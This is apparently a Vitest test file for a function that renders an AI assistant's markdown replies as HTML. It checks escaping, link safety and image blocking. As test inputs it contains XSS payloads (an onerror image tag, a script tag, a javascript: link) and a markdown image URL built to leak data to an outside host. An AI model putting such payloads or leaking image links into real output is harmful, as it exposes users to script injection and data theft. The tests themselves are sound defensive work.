import { renderAssistantMarkdown } from '@/lib/assistant-markdown';
import { describe, expect, it } from 'vitest';

describe('renderAssistantMarkdown', () => {
    it('renders lists, emphasis and code', () => {
        const html = renderAssistantMarkdown(
            '- **Read** 12 books\n- Run `5 km`',
        );

        expect(html).toContain('<ul>');
        expect(html).toContain('<strong>Read</strong>');
        expect(html).toContain('<code>5 km</code>');
    });

    it('escapes raw HTML instead of rendering it', () => {
        const html = renderAssistantMarkdown(
            '<img src=x onerror="alert(1)"><script>alert(1)</script>',
        );

        expect(html).not.toContain('<img');
        expect(html).not.toContain('<script');
        expect(html).toContain('&lt;script&gt;');
    });

    it('never loads an image, so a reply cannot leak data through an image address', () => {
        const html = renderAssistantMarkdown(
            '![goal](https://example.com/leak?title=secret)',
        );

        expect(html).not.toContain('<img');
    });

    it('opens links in a new tab without passing the opener', () => {
        const html = renderAssistantMarkdown('[docs](https://example.com)');

        expect(html).toContain('target="_blank"');
        expect(html).toContain('rel="noopener noreferrer nofollow"');
    });

    it('does not turn a script address into a link', () => {
        const html = renderAssistantMarkdown('[click](javascript:alert(1))');

        expect(html).not.toContain('href');
    });
});
